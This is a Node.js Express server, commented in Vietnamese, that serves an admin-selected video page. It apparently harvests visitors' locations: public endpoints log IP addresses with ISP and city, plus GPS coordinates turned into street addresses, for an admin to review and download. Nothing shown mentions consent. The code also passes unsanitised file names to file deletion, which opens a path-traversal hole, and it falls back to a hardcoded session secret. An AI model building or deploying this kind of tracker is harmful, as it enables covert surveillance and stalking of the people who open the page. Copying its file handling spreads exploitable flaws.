// ==========================================================
// PHẦN 1: IMPORTS VÀ CẤU HÌNH BAN ĐẦU
// ==========================================================
import express from "express";
import fetch from "node-fetch";
import { promises as fs } from "fs";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";
import multer from "multer";
import session from "express-session";
// --- SỬA 1: dùng named export thay vì default ---
import { RedisStore } from "connect-redis";
import { createClient } from "redis";

// --- Cấu hình Biến môi trường ---
dotenv.config();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

// --- Cấu hình Redis Client ---
const redisClient = createClient();
// Nếu cần log lỗi kết nối:
redisClient.on("error", (err) => console.error("Redis Client Error:", err));
redisClient.connect().catch(console.error);

// --- Cấu hình Redis Store cho Session ---
// --- SỬA 2: Khởi tạo trực tiếp class RedisStore ---
const redisStore = new RedisStore({
  client: redisClient,
  prefix: "myapp-session:", // Giúp phân biệt session của các app khác nhau nếu dùng chung Redis
});

// --- Cấu hình Multer để lưu file upload ---
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const destPath = path.join(__dirname, "public", "videos");
    // Đảm bảo thư mục tồn tại trước khi lưu
    fs.mkdir(destPath, { recursive: true })
      .then(() => {
        cb(null, destPath);
      })
      .catch((err) => cb(err));
  },
  filename: function (req, file, cb) {
    // Tạo tên file độc nhất để tránh ghi đè
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  },
});
const upload = multer({ storage: storage });

// ==========================================================
// PHẦN 2: MIDDLEWARES
// ==========================================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Cấu hình Session với Redis ---
app.use(
  session({
    store: redisStore, // Sử dụng Redis để lưu trữ
    secret:
      process.env.SESSION_SECRET || "mot-chuoi-bi-mat-rat-an-toan-mac-dinh",
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: process.env.NODE_ENV === "production", // Chỉ bật secure mode khi chạy thật (HTTPS)
      httpOnly: true, // Ngăn JavaScript phía client truy cập cookie
      sameSite: "lax", // Biện pháp chống tấn công CSRF
      maxAge: 1000 * 60 * 60 * 24 * 7, // Session tồn tại trong 7 ngày
    },
  })
);

app.use(express.static(path.join(__dirname, "public")));

// --- Middleware kiểm tra đăng nhập ---
const requireLogin = (req, res, next) => {
  if (req.session.isLoggedIn) {
    return next(); // Đã đăng nhập, cho phép đi tiếp
  }

  // Nếu chưa đăng nhập và là API request, trả về lỗi JSON
  if (req.path.startsWith("/api/")) {
    return res
      .status(401)
      .json({ message: "Phiên đăng nhập đã hết hạn. Vui lòng tải lại trang." });
  }

  // Nếu là trang thông thường, chuyển hướng về trang login
  res.redirect("/admin");
};

// ==========================================================
// PHẦN 3: CÁC API CÔNG KHAI (DÀNH CHO NGƯỜI DÙNG)
// ==========================================================

// API ghi log vị trí ước tính dựa trên IP
app.post("/api/log-ip-location", async (req, res) => {
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toLocaleString("vi-VN", {
    timeZone: "Asia/Ho_Chi_Minh",
  });
  let locationInfo = `[${timestamp}] User IP: ${userIP}\n  Location: (Unknown or Local IP)\n  ISP: N/A`;
  try {
    if (userIP && !userIP.includes("127.0.0.1") && !userIP.includes("::1")) {
      const response = await fetch(
        `http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp`
      );
      const apiData = await response.json();
      if (apiData.status !== "fail") {
        locationInfo = `[${timestamp}] User IP: ${userIP}\n  Estimated Location: ${apiData.city}, ${apiData.regionName}, ${apiData.country}\n  ISP: ${apiData.isp}`;
      }
    }
  } catch (error) {
    console.error("Could not connect to ip-api.com:", error.message);
  }
  try {
    await fs.appendFile("ip_logs.txt", `\n${locationInfo}\n`, "utf8");
    res.status(200).json({ message: "IP location log attempted" });
  } catch (fileError) {
    console.error("Error writing IP log:", fileError);
    res.status(500).json({ message: "Failed to write to log file" });
  }
});

// API ghi log vị trí chính xác
app.post("/api/log-precise-location", async (req, res) => {
  try {
    const { latitude, longitude } = req.body;
    const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const geoResponse = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`,
      { headers: { "User-Agent": "PreciseLogger/1.0" } }
    );
    const geoData = await geoResponse.json();
    const detailedAddress = geoData.display_name || "N/A";
    const timestamp = new Date().toLocaleString("vi-VN", {
      timeZone: "Asia/Ho_Chi_Minh",
    });
    const logData = `\n[${timestamp}] User IP: ${userIP}\n  Precise Coords: Latitude: ${latitude}, Longitude: ${longitude}\n  Detailed Address: ${detailedAddress}\n`;
    await fs.appendFile("precise_logs.txt", logData, "utf8");
    res.status(200).json({ message: "Precise location logged successfully" });
  } catch (error) {
    console.error("Error logging precise location:", error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

// API lấy video đang được kích hoạt để hiển thị trên trang chủ
app.get("/api/active-video", async (req, res) => {
  const configPath = path.join(__dirname, "data", "config.json");
  try {
    await fs.access(configPath);
    const fileContents = await fs.readFile(configPath, "utf8");
    const config = JSON.parse(fileContents);
    res.json({ url: config.activeVideo });
  } catch (error) {
    res.status(200).json({ url: "" });
  }
});

// ==========================================================
// PHẦN 4: CÁC ROUTE VÀ API CỦA ADMIN
// ==========================================================

// --- Route phục vụ các trang HTML của Admin ---
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});
app.post("/admin/login", (req, res) => {
  if (req.body.password === ADMIN_PASSWORD) {
    req.session.isLoggedIn = true;
    res.redirect("/admin/dashboard");
  } else {
    res.status(401).send(`<h1>Sai mật khẩu!</h1><a href="/admin">Thử lại</a>`);
  }
});

// Áp dụng middleware requireLogin cho các route cần bảo vệ
app.get("/admin/dashboard", requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});
app.get("/admin/videos", requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "videos-manager.html"));
});

// --- API Admin để quản lý LOG (Bảo vệ bằng middleware) ---
app.get("/admin/api/logs/:logType", requireLogin, async (req, res) => {
  const { logType } = req.params;
  if (logType !== "ip" && logType !== "precise") {
    return res.status(400).send("Loại log không hợp lệ.");
  }
  const fileName = `${logType}_logs.txt`;
  const logFilePath = path.join(__dirname, fileName);
  try {
    await fs.access(logFilePath);
    res.type("text/plain").sendFile(logFilePath);
  } catch {
    res.send(`File log '${fileName}' chưa được tạo hoặc trống.`);
  }
});

app.get("/admin/api/download/:logType", requireLogin, async (req, res) => {
  const { logType } = req.params;
  if (logType !== "ip" && logType !== "precise") {
    return res.status(400).send("Loại log không hợp lệ.");
  }
  const fileName = `${logType}_logs.txt`;
  const logFilePath = path.join(__dirname, fileName);
  try {
    await fs.access(logFilePath);
    res.download(logFilePath);
  } catch {
    res.status(404).send(`File log '${fileName}' không tồn tại để tải.`);
  }
});

app.post("/admin/api/clear-logs/:logType", requireLogin, async (req, res) => {
  const { logType } = req.params;
  if (logType !== "ip" && logType !== "precise") {
    return res.status(400).json({ message: "Loại log không hợp lệ." });
  }
  const fileName = `${logType}_logs.txt`;
  const logFilePath = path.join(__dirname, fileName);
  try {
    await fs.unlink(logFilePath);
    res
      .status(200)
      .json({ message: `File log '${fileName}' đã được xóa thành công.` });
  } catch (err) {
    if (err.code === "ENOENT") {
      return res.status(200).json({
        message: `File log '${fileName}' không tồn tại, không có gì để xóa.`,
      });
    }
    res.status(500).json({ message: "Không thể xóa file log do lỗi server." });
  }
});

// --- API Admin để quản lý VIDEO (Bảo vệ bằng middleware) ---
app.post(
  "/api/admin/videos/upload",
  requireLogin,
  upload.single("videoFile"),
  (req, res) => {
    if (!req.file) {
      return res
        .status(400)
        .json({ message: "Vui lòng chọn một file để upload." });
    }
    res.status(200).json({
      message: `File '${req.file.filename}' đã được upload thành công.`,
      filePath: `/videos/${req.file.filename}`,
    });
  }
);

app.get("/api/admin/videos", requireLogin, async (req, res) => {
  const videosDirectory = path.join(__dirname, "public", "videos");
  try {
    await fs.mkdir(videosDirectory, { recursive: true });
    const fileNames = await fs.readdir(videosDirectory);
    res.json(fileNames);
  } catch (error) {
    res.status(500).json({ error: "Không thể lấy danh sách video" });
  }
});

app.post("/api/admin/videos/set-active", requireLogin, async (req, res) => {
  const { fileName } = req.body;
  if (!fileName) {
    return res.status(400).json({ error: "Tên file là bắt buộc" });
  }
  try {
    const configDir = path.join(__dirname, "data");
    const configPath = path.join(configDir, "config.json");
    const newConfig = { activeVideo: `/videos/${fileName}` };

    await fs.mkdir(configDir, { recursive: true });
    await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2));

    res.json({ message: `Đã đặt ${fileName} làm video chính.` });
  } catch (error) {
    console.error("Lỗi khi đặt video chính:", error);
    res.status(500).json({ error: "Lỗi khi đặt video chính" });
  }
});

app.post("/api/admin/videos/delete", requireLogin, async (req, res) => {
  const { fileName } = req.body;
  if (!fileName) {
    return res.status(400).json({ error: "Tên file là bắt buộc" });
  }
  try {
    const filePath = path.join(__dirname, "public", "videos", fileName);
    await fs.unlink(filePath);

    const configDir = path.join(__dirname, "data");
    const configPath = path.join(configDir, "config.json");
    try {
      const fileContents = await fs.readFile(configPath, "utf8");
      const config = JSON.parse(fileContents);
      if (config.activeVideo === `/videos/${fileName}`) {
        const newConfig = { activeVideo: "" };
        await fs.writeFile(configPath, JSON.stringify(newConfig, null, 2));
      }
    } catch (configError) {
      // Bỏ qua lỗi nếu file config không tồn tại
    }

    res.json({ message: `Đã xóa video '${fileName}' thành công.` });
  } catch (error) {
    console.error("Lỗi khi xóa video:", error);
    res.status(500).json({ error: `Không thể xóa video '${fileName}'.` });
  }
});

// ==========================================================
// PHẦN 5: KHỞI ĐỘNG SERVER
// ==========================================================
app.listen(PORT, () => {
  console.log(`Server đang chạy tại http://localhost:${PORT}`);
  if (!ADMIN_PASSWORD) {
    console.warn(
      "CẢNH BÁO: ADMIN_PASSWORD chưa được thiết lập trong file .env!"
    );
  }
});
